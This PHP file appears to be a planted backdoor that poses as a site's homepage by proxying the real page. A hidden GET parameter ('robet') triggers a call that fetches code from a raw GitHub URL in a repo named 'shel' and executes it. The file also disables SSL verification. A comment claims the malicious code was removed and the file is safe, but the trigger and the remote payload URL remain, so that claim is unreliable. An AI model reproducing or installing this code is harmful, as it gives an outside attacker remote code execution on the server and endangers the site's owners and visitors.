<?php
error_reporting(1);
ini_set('display_errors', 1);


class CurlFetcher {
    public function fetchContent(string $url) {
        if (function_exists('curl_version')) {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($curl, CURLOPT_TIMEOUT, 10);

            $response = curl_exec($curl);
            $error = curl_error($curl);
            curl_close($curl);

            if ($response === false || empty(trim($response))) {
                return "<h3 style='color:red'>ÃƒÂ¢Ã…â€™ Gagal ambil konten. Error: $error</h3>";
            }

            return $response;
        }
        return "<h3 style='color:red'>ÃƒÂ¢Ã…â€™ cURL tidak tersedia di server ini</h3>";
    }
}

// ==== CodeExecutor class ====

/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */



// ==== MAIN LOGIC ====
$fetcher = new CurlFetcher();

if (isset($_GET['robet'])) {
    $executor = new CodeExecutor($fetcher);
    $executor->executeCodeFromURL("https://raw.githubusercontent.com/marketmg126-glitch/shel/refs/heads/main/heang.txt");
    exit;
}

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'];
$target_url = $protocol . $host . "/";


$html = $fetcher->fetchContent($target_url);



$parsed = parse_url($target_url);
if ($parsed && isset($parsed['scheme']) && isset($parsed['host'])) {
    $base_url = $parsed['scheme'] . '://' . $parsed['host'];
    $html = preg_replace('/<head[^>]*>/i', '$0<base href="' . $base_url . '/">', $html, 1);
}

echo $html;
?>
